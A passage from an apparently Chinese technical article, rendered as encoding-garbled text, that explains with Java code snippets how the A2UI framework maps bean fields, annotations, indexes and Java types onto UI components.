<p><strong>å‘½åçº¦å®šç¡®å®šæ€§ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-title class_">String</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> name;
}  <span class="hljs-comment">// -&gt; fieldName = "name"</span>

public <span class="hljs-title class_">String</span> <span class="hljs-title function_">getUserName</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> userName;
}  <span class="hljs-comment">// -&gt; fieldName = "userName"</span>

public boolean <span class="hljs-title function_">isActive</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> active;
}  <span class="hljs-comment">// -&gt; fieldName = "active"</span>

public <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span>(<span class="hljs-params">Integer age</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}  <span class="hljs-comment">// -&gt; fieldName = "age"</span>

<span class="hljs-comment">// ç¡®å®šæ€§åˆ†æï¼š</span>
<span class="hljs-comment">// 1. getName()å¿…ç„¶å¯¹åº”nameå­—æ®µ</span>
<span class="hljs-comment">// 2. getUserName()å¿…ç„¶å¯¹åº”userNameå­—æ®µ</span>
<span class="hljs-comment">// 3. isActive()å¿…ç„¶å¯¹åº”activeå­—æ®µ</span>
<span class="hljs-comment">// 4. setAge()å¿…ç„¶å¯¹åº”ageå­—æ®µ</span>
</code></pre>
<h4 data-id="heading-22">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆå‘½åçº¦å®šèƒ½æä¾›ç¡®å®šæ€§ï¼Ÿ</strong>
<ul>
<li>Java Beanè§„èŒƒæ˜¯ä¸šç•Œæ ‡å‡†</li>
<li>å‘½åè§„åˆ™æ˜¯æ˜ç¡®çš„</li>
<li>æ–¹æ³•ååˆ°å­—æ®µåçš„æ˜ å°„æ˜¯å›ºå®šçš„</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦æ”¯æŒå¤šç§å‘½åæ¨¡å¼ï¼Ÿ</strong>
<ul>
<li>æ”¯æŒæ ‡å‡†çš„Getter/Setter</li>
<li>æ”¯æŒBooleançš„isXxxæ¨¡å¼</li>
<li>æ”¯æŒé©¼å³°å‘½åè½¬æ¢</li>
</ul>
</li>
</ol>
<h3 data-id="heading-23">4. ç´¢å¼•å±‚ç¡®å®šæ€§</h3>
<p>ç´¢å¼•å±æ€§æ˜¯A2UIç¡®å®šæ€§çš„ç¬¬å››å±‚ä¿éšœï¼Œé€šè¿‡ç´¢å¼•ä¿è¯å­—æ®µé¡ºåºçš„ç¡®å®šæ€§ã€‚</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4f842ee622a4ecfad9740ef52a62f9f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=fZrx%2BFa6joZcbFb%2B%2FLBj%2FHTzXmw%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>ç´¢å¼•ç¡®å®šæ€§ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserForm</span> {
    private <span class="hljs-title class_">String</span> name;        <span class="hljs-comment">// index = 0</span>
    private <span class="hljs-title class_">Integer</span> age;       <span class="hljs-comment">// index = 1</span>
    private <span class="hljs-title class_">Date</span> birthday;     <span class="hljs-comment">// index = 2</span>
    private <span class="hljs-title class_">Boolean</span> active;    <span class="hljs-comment">// index = 3</span>

    @<span class="hljs-title class_">CustomAnnotation</span>(index = <span class="hljs-number">10</span>)
    private <span class="hljs-title class_">String</span> email;      <span class="hljs-comment">// index = 10 (è‡ªå®šä¹‰ç´¢å¼•)</span>
}

<span class="hljs-comment">// ç¡®å®šæ€§åˆ†æï¼š</span>
<span class="hljs-comment">// 1. nameå­—æ®µå¿…ç„¶åœ¨ç¬¬ä¸€ä¸ªä½ç½®</span>
<span class="hljs-comment">// 2. ageå­—æ®µå¿…ç„¶åœ¨ç¬¬äºŒä¸ªä½ç½®</span>
<span class="hljs-comment">// 3. birthdayå­—æ®µå¿…ç„¶åœ¨ç¬¬ä¸‰ä¸ªä½ç½®</span>
<span class="hljs-comment">// 4. activeå­—æ®µå¿…ç„¶åœ¨ç¬¬å››ä¸ªä½ç½®</span>
<span class="hljs-comment">// 5. emailå­—æ®µå¿…ç„¶åœ¨ç¬¬åä¸ªä½ç½®ï¼ˆè‡ªå®šä¹‰ç´¢å¼•ï¼‰</span>
</code></pre>
<h4 data-id="heading-24">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆç´¢å¼•èƒ½æä¾›ç¡®å®šæ€§ï¼Ÿ</strong>
<ul>
<li>ç´¢å¼•æ˜¯æ•´æ•°ï¼Œå¯ä»¥æ’åº</li>
<li>ç´¢å¼•çš„åˆ†é…è§„åˆ™æ˜¯å›ºå®šçš„</li>
<li>ç´¢å¼•çš„ä¼˜å…ˆçº§æ˜¯æ˜ç¡®çš„</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦æ”¯æŒè‡ªå®šä¹‰ç´¢å¼•ï¼Ÿ</strong>
<ul>
<li>å…è®¸å¼€å‘è€…è°ƒæ•´å­—æ®µé¡ºåº</li>
<li>æ”¯æŒå­—æ®µçš„çµæ´»æ’åˆ—</li>
<li>æ»¡è¶³ä¸åŒçš„UIéœ€æ±‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-25">5. æ˜ å°„è§„åˆ™å±‚ç¡®å®šæ€§</h3>
<p>æ˜ å°„è§„åˆ™æ˜¯A2UIç¡®å®šæ€§çš„ç¬¬äº”å±‚ä¿éšœï¼Œé€šè¿‡æ˜ å°„è§„åˆ™æä¾›ç»„ä»¶é€‰æ‹©çš„ç¡®å®šæ€§ã€‚</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4594f0f83e9f46d1a75a9031a04a65c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=m5zl9EEW69yRKrAHfmXvOlmUtmc%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>æ˜ å°„è§„åˆ™ç¡®å®šæ€§ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ComponentType -&gt; UIComponent</span>
<span class="hljs-variable constant_">INPUT</span> -&gt; <span class="hljs-title class_">InputUIComponent</span>
<span class="hljs-variable constant_">CHECKBOX</span> -&gt; <span class="hljs-title class_">CheckboxUIComponent</span>
<span class="hljs-variable constant_">COMBOINPUT</span> -&gt; <span class="hljs-title class_">ComboInputUIComponent</span>
<span class="hljs-variable constant_">RICHEDITOR</span> -&gt; <span class="hljs-title class_">RichEditorUIComponent</span>

<span class="hljs-comment">// ComboInputType -&gt; ComboBoxMeta</span>
number -&gt; <span class="hljs-title class_">NumberComboBoxMeta</span>
date -&gt; <span class="hljs-title class_">DateComboBoxMeta</span>
checkbox -&gt; <span class="hljs-title class_">CheckboxComboBoxMeta</span>
listbox -&gt; <span class="hljs-title class_">ListboxComboBoxMeta</span>

<span class="hljs-comment">// ColType -&gt; ComponentType</span>
<span class="hljs-variable constant_">BOOLEAN</span> -&gt; <span class="hljs-variable constant_">CHECKBOX</span>
<span class="hljs-variable constant_">TEXT</span> -&gt; <span class="hljs-variable constant_">MULTILINES</span>
<span class="hljs-variable constant_">DATETIME</span> -&gt; <span class="hljs-variable constant_">COMBOINPUT</span>

<span class="hljs-comment">// ç¡®å®šæ€§åˆ†æï¼š</span>
<span class="hljs-comment">// 1. INPUTå¿…ç„¶æ˜ å°„åˆ°InputUIComponent</span>
<span class="hljs-comment">// 2. CHECKBOXå¿…ç„¶æ˜ å°„åˆ°CheckboxUIComponent</span>
<span class="hljs-comment">// 3. numberå¿…ç„¶æ˜ å°„åˆ°NumberComboBoxMeta</span>
<span class="hljs-comment">// 4. BOOLEANå¿…ç„¶æ˜ å°„åˆ°CHECKBOX</span>
</code></pre>
<h4 data-id="heading-26">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆæ˜ å°„è§„åˆ™èƒ½æä¾›ç¡®å®šæ€§ï¼Ÿ</strong>
<ul>
<li>æ˜ å°„è§„åˆ™æ˜¯é¢„å®šä¹‰çš„</li>
<li>æ˜ å°„å…³ç³»æ˜¯ä¸€å¯¹ä¸€çš„</li>
<li>æ˜ å°„è§„åˆ™ä¸ä¼šåœ¨è¿è¡Œæ—¶æ”¹å˜</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦å¤šå±‚æ¬¡çš„æ˜ å°„ï¼Ÿ</strong>
<ul>
<li>æ”¯æŒä¸åŒçš„æŠ½è±¡å±‚æ¬¡</li>
<li>æ”¯æŒä¸åŒçš„ä½¿ç”¨åœºæ™¯</li>
<li>æä¾›çµæ´»çš„æ˜ å°„æœºåˆ¶</li>
</ul>
</li>
</ol>
<h2 data-id="heading-27">ç»„ç»‡ç±»æ–¹æ³•çš„åŸåˆ™è§„åˆ™</h2>
<p>A2UIç»„ç»‡ç±»æ–¹æ³•éµå¾ªå…­å¤§åŸåˆ™ï¼Œæ¯ä¸ªåŸåˆ™éƒ½æœ‰å…¶ç‰¹å®šçš„è®¾è®¡ç›®çš„å’Œå®ç°æ–¹å¼ã€‚</p>
<h3 data-id="heading-28">åŸåˆ™1ï¼šå­—æ®µä¼˜å…ˆåŸåˆ™</h3>
<p>å­—æ®µä¼˜å…ˆåŸåˆ™æ˜¯æŒ‡åœ¨å­—æ®µå’Œæ–¹æ³•éƒ½å­˜åœ¨æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨å­—æ®µçš„å®šä¹‰ã€‚</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fb551f5bb63480eb2443910c69c8354~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=YjjNnxFx3mHlQkPVauwJ1nWmY%2FQ%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-title class_">BridgeMethodConfig</span> methodInfo : methodInfos) {
    <span class="hljs-keyword">if</span> (methodInfo.<span class="hljs-title function_">isSerialize</span>()) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">MethodUtil</span>.<span class="hljs-title function_">isGetMethod</span>(methodInfo.<span class="hljs-title function_">getInnerMethod</span>()) || methodInfo.<span class="hljs-title function_">isModule</span>()) {
            <span class="hljs-title class_">String</span> fieldName = methodInfo.<span class="hljs-title function_">getFieldName</span>();
            <span class="hljs-title class_">CustomAnnotation</span> allmapping = customAnnotationMap.<span class="hljs-title function_">get</span>(fieldName);

            <span class="hljs-comment">// å­—æ®µå¿…é¡»å¯è§</span>
            <span class="hljs-keyword">if</span> (!disableFieldMap.<span class="hljs-title function_">containsKey</span>(methodInfo.<span class="hljs-title function_">getFieldName</span>())) {
                <span class="hljs-comment">// å¦‚æœå­—æ®µæœªå®šä¹‰æˆ–ä¸ºé»˜è®¤å­—æ®µï¼Œæ‰ä½¿ç”¨æ–¹æ³•</span>
                <span class="hljs-title class_">BridgeField</span> field = fieldMap.<span class="hljs-title function_">get</span>(fieldName.<span class="hljs-title function_">toLowerCase</span>());
                <span class="hljs-keyword">if</span> (field == <span class="hljs-literal">null</span>
                        || !(field <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">BridgeFieldConfig</span>)
                        || ((<span class="hljs-title class_">BridgeFieldConfig</span>) fieldMap.<span class="hljs-title function_">get</span>(fieldName.<span class="hljs-title function_">toLowerCase</span>())).<span class="hljs-title function_">isDefault</span>()) {
                    fieldMap.<span class="hljs-title function_">put</span>(fieldName.<span class="hljs-title function_">toLowerCase</span>(), methodInfo);
                    esdFieldMap.<span class="hljs-title function_">put</span>(methodInfo.<span class="hljs-title function_">getFieldName</span>(), methodInfo);
                    <span class="hljs-keyword">if</span> (!fieldNameList.<span class="hljs-title function_">contains</span>(methodInfo.<span class="hljs-title function_">getFieldName</span>())) {
                        fieldNameList.<span class="hljs-title function_">add</span>(methodInfo.<span class="hljs-title function_">getFieldName</span>());
                    }
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">if</span> (allmapping == <span class="hljs-literal">null</span> &amp;&amp; (methodInfo.<span class="hljs-title function_">isCustomFiled</span>() || methodInfo.<span class="hljs-title function_">isDynLoad</span>())) {
                        <span class="hljs-comment">// ä¼˜å…ˆä½¿ç”¨å­—æ®µæ³¨è§£</span>
                        fieldMap.<span class="hljs-title function_">put</span>(fieldName.<span class="hljs-title function_">toLowerCase</span>(), methodInfo);
                    }
                }
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-29">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆå­—æ®µä¼˜å…ˆï¼Ÿ</strong>
<ul>
<li>å­—æ®µæ˜¯æ•°æ®çš„ç›´æ¥è¡¨ç¤ºï¼Œæ›´ç›´è§‚</li>
<li>å­—æ®µçš„ç±»å‹å’Œæ³¨è§£æ›´æ˜ç¡®</li>
<li>å‡å°‘æ–¹æ³•è§£æçš„å¤æ‚æ€§</li>
</ul>
</li>
<li><strong>ä»€ä¹ˆæ—¶å€™ä½¿ç”¨æ–¹æ³•ï¼Ÿ</strong>
<ul>
<li>å­—æ®µæœªå®šä¹‰æ—¶</li>
<li>å­—æ®µä¸ºé»˜è®¤å­—æ®µæ—¶</li>
<li>æ–¹æ³•æœ‰è‡ªå®šä¹‰æ³¨è§£æ—¶</li>
</ul>
</li>
</ol>
<h3 data-id="heading-30">åŸåˆ™2ï¼šGetter/Setterè¯†åˆ«åŸåˆ™</h3>
<p>Getter/Setterè¯†åˆ«åŸåˆ™æ˜¯æŒ‡é€šè¿‡æ–¹æ³•åè¯†åˆ«Getterå’ŒSetteræ–¹æ³•ã€‚</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bc0882c7478471a9446aa9658380782~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=MHndJ9OMtG6NbK%2Fyanx0jPaYQew%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldName</span> = <span class="hljs-title class_">MethodUtil</span>.<span class="hljs-title function_">getFieldName</span>(method);

<span class="hljs-comment">// MethodUtil.getFieldName() å®ç°é€»è¾‘</span>
public <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getFieldName</span>(<span class="hljs-params">Method method</span>) {
    <span class="hljs-title class_">String</span> methodName = method.<span class="hljs-title function_">getName</span>();
    <span class="hljs-keyword">if</span> (methodName.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"get"</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">OODUtil</span>.<span class="hljs-title function_">formatJavaName</span>(methodName.<span class="hljs-title function_">substring</span>(<span class="hljs-number">3</span>), <span class="hljs-literal">false</span>);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"set"</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">OODUtil</span>.<span class="hljs-title function_">formatJavaName</span>(methodName.<span class="hljs-title function_">substring</span>(<span class="hljs-number">3</span>), <span class="hljs-literal">false</span>);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"is"</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">OODUtil</span>.<span class="hljs-title function_">formatJavaName</span>(methodName.<span class="hljs-title function_">substring</span>(<span class="hljs-number">2</span>), <span class="hljs-literal">false</span>);
    }
    <span class="hljs-keyword">return</span> methodName;
}
</code></pre>
<h4 data-id="heading-31">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆè¯†åˆ«Getter/Setterï¼Ÿ</strong>
<ul>
<li>ç¬¦åˆJava Beanè§„èŒƒ</li>
<li>æä¾›å¯¹ç§æœ‰å­—æ®µçš„è®¿é—®</li>
<li>æ”¯æŒåŠ¨æ€è®¡ç®—å­—æ®µ</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦ä¸‰ç§æ¨¡å¼ï¼Ÿ</strong>
<ul>
<li>getXxxï¼šæ ‡å‡†Getter</li>
<li>setXxxï¼šæ ‡å‡†Setter</li>
<li>isXxxï¼šBoolean Getter</li>
</ul>
</li>
</ol>
<h3 data-id="heading-32">åŸåˆ™3ï¼šæ³¨è§£ä¼˜å…ˆçº§åŸåˆ™</h3>
<p>æ³¨è§£ä¼˜å…ˆçº§åŸåˆ™æ˜¯æŒ‡ä¸åŒæ³¨è§£ä¹‹é—´æœ‰æ˜ç¡®çš„ä¼˜å…ˆçº§é¡ºåºã€‚</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5495561b33dc40088bf7206a9cba0eb8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=hngpTzNUiSyJ6WM0vDtM%2Bk3tmgs%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">Integer index, BridgeClass bridgeClass</span>) {
    <span class="hljs-comment">// ...</span>

    <span class="hljs-comment">// CustomAnnotation - æœ€é«˜ä¼˜å…ˆçº§</span>
    <span class="hljs-keyword">if</span> (customAnnotation != <span class="hljs-literal">null</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">customBean</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomFieldMeta</span>(customAnnotation);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span> = customBean.<span class="hljs-title function_">getIndex</span>();
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">target</span> = customBean.<span class="hljs-title function_">getTarget</span>();
        <span class="hljs-keyword">if</span> (customAnnotation.<span class="hljs-title function_">hidden</span>()) {
            componentType = <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">HIDDENINPUT</span>;
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">hidden</span> = <span class="hljs-literal">true</span>;
        }
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isCaption</span> = customAnnotation.<span class="hljs-title function_">captionField</span>();
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">uid</span> = customAnnotation.<span class="hljs-title function_">uid</span>();
        <span class="hljs-comment">// ...</span>
    }

    <span class="hljs-comment">// JSONField - è¦†ç›–åŸºæœ¬å±æ€§</span>
    <span class="hljs-keyword">if</span> (jsonField != <span class="hljs-literal">null</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">serialize</span> = jsonField.<span class="hljs-title function_">serialize</span>();
        <span class="hljs-keyword">if</span> (!jsonField.<span class="hljs-title function_">name</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-string">""</span>)) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldName</span> = jsonField.<span class="hljs-title function_">name</span>();
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = jsonField.<span class="hljs-title function_">name</span>();
        }
        <span class="hljs-keyword">if</span> (!jsonField.<span class="hljs-title function_">name</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-string">""</span>)) {
            id = jsonField.<span class="hljs-title function_">name</span>();
        }
    }

    <span class="hljs-comment">// ä¸­æ–‡æ³¨è§£ - æœ€åè¦†ç›–</span>
    <span class="hljs-keyword">if</span> (caption == <span class="hljs-literal">null</span> || caption.<span class="hljs-title function_">equals</span>(<span class="hljs-string">""</span>)) {
        <span class="hljs-keyword">if</span> (methodChinaName != <span class="hljs-literal">null</span>) {
            caption = methodChinaName.<span class="hljs-title function_">cname</span>();
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">if</span> (caption.<span class="hljs-title function_">equals</span>(<span class="hljs-string">""</span>)) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">caption</span> = name;
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-33">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦ä¼˜å…ˆçº§ï¼Ÿ</strong>
<ul>
<li>æ”¯æŒçµæ´»çš„é…ç½®</li>
<li>å…è®¸è¦†ç›–é»˜è®¤è¡Œä¸º</li>
<li>ä¿æŒå‘åå…¼å®¹æ€§</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆCustomAnnotationä¼˜å…ˆçº§æœ€é«˜ï¼Ÿ</strong>
<ul>
<li>CustomAnnotationæ˜¯ä¸šåŠ¡æ³¨è§£</li>
<li>ä¸šåŠ¡éœ€æ±‚ä¼˜å…ˆäºæ¡†æ¶éœ€æ±‚</li>
<li>æ”¯æŒè‡ªå®šä¹‰ä¸šåŠ¡é€»è¾‘</li>
</ul>
</li>
</ol>
<h3 data-id="heading-34">åŸåˆ™4ï¼šç´¢å¼•æ’åºåŸåˆ™</h3>
<p>ç´¢å¼•æ’åºåŸåˆ™æ˜¯æŒ‡æŒ‰ç…§ç´¢å¼•å€¼å¯¹å­—æ®µè¿›è¡Œæ’åºã€‚</p>
<p>Index Sorting</p>
<p>Get All Fields</p>
<p>Sort by Index</p>
<p>Render in Order</p>
<p>Field1: index=0</p>
<p>Field2: index=1</p>
<p>Field3: index=2</p>
<p>Field4: index=10</p>
<p>Field1, Field2, Field3, Field4</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">int index = <span class="hljs-number">0</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> field : allCtFields) {
    fieldTasks.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InitFieldTask</span>&lt;&gt;(field, index, <span class="hljs-variable language_">this</span>));
    index++;
}

<span class="hljs-comment">// BridgeBaseField.java</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span> = index;

@<span class="hljs-title class_">Override</span>
public int <span class="hljs-title function_">compareTo</span>(<span class="hljs-params">BridgeField o</span>) {
    <span class="hljs-keyword">if</span> (index == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
    }

    <span class="hljs-keyword">if</span> (index != <span class="hljs-literal">null</span> &amp;&amp; o.<span class="hljs-title function_">getIndex</span>() != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span> - o.<span class="hljs-title function_">getIndex</span>();
    }

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-35">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦ç´¢å¼•æ’åºï¼Ÿ</strong>
<ul>
<li>ä¿è¯å­—æ®µé¡ºåºçš„ç¡®å®šæ€§</li>
<li>æ”¯æŒè‡ªå®šä¹‰æ’åº</li>
<li>ä¾¿äºUIæ¸²æŸ“</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆä½¿ç”¨compareToï¼Ÿ</strong>
<ul>
<li>æ”¯æŒCollections.sort()</li>
<li>æä¾›çµæ´»çš„æ’åºæœºåˆ¶</li>
<li>ç¬¦åˆJavaè§„èŒƒ</li>
</ul>
</li>
</ol>
<h3 data-id="heading-36">åŸåˆ™5ï¼šç±»å‹æ¨æ–­åŸåˆ™</h3>
<p>ç±»å‹æ¨æ–­åŸåˆ™æ˜¯æŒ‡æ ¹æ®Javaç±»å‹æ¨æ–­UIç»„ä»¶ç±»å‹ã€‚</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1863ca9a3d44df6ab8775a50cd2e673~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=ZEXXjwpffg16Pgu6BoWTLXC1OWQ%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-keyword">static</span> <span class="hljs-title class_">ComponentType</span> <span class="hljs-title function_">getComponentType</span>(<span class="hljs-params">Class typeClass, Type type</span>) {
    <span class="hljs-title class_">Class</span> clazz = <span class="hljs-title class_">JSON</span>GenUtil.<span class="hljs-title function_">getInnerType</span>(type);

    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Enumstype</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(clazz) || clazz.<span class="hljs-title function_">isEnum</span>()) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (typeClass != <span class="hljs-literal">null</span> &amp;&amp; (typeClass.<span class="hljs-title function_">isArray</span>() || <span class="hljs-title class_">Collection</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(typeClass))) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Arrays</span>.<span class="hljs-title function_">asList</span>(customClass).<span class="hljs-title function_">contains</span>(clazz) || typeClass.<span class="hljs-title function_">equals</span>(clazz)) {
            <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">LIST</span>;
        }
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(boolean.<span class="hljs-property">class</span>) || clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Boolean</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">CHECKBOX</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(int.<span class="hljs-property">class</span>) || clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Integer</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Reader</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">RICHEDITOR</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">StringBuffer</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">RICHEDITOR</span>;
    }

    <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">INPUT</span>;
}
</code></pre>
<h4 data-id="heading-37">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦ç±»å‹æ¨æ–­ï¼Ÿ</strong>
<ul>
<li>å‡å°‘æ³¨è§£çš„ä½¿ç”¨</li>
<li>æä¾›åˆç†çš„é»˜è®¤å€¼</li>
<li>æé«˜å¼€å‘æ•ˆç‡</li>
</ul>
</li>
